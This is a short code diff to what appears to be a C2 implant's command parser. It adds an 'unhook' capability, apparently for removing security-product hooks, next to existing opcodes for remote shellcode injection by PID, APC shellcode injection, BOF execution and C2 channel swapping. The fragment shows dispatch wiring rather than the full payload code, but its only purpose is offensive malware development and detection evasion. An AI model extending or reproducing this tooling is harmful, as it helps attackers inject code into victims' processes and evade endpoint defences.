@@ -9,6 +9,7 @@
 #include "hackmods/sandbox.h"
 #include "hackmods/injectors.h"
 #include "hackmods/bof.h"
+#include "hackmods/unhook.h"
 #define pstr(x) printf("len=%d, data=%.*s\n", x.len, x.len, x.data)
 #define fs(x) free(x.data)
 
@@ -28,7 +29,8 @@ enum Opcodes{
     REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
     SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
     BOF_EXECUTE, //1//bof_execute file([bof file])
-    SWAP_C2 //?//swap_c2 [c2 method] ... [poll interval]
+    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
+    UNHOOK //0//auto remove hooks
 };
 
 int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
@@ -87,6 +89,8 @@ int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
     }else if(mnem == BOF_EXECUTE){
         String data = popstr(sp);
         loadBOF(data.data, data.len, conn);
+    }else if(mnem == UNHOOK){
+        unhook();
     }else{
         return 1;
     }
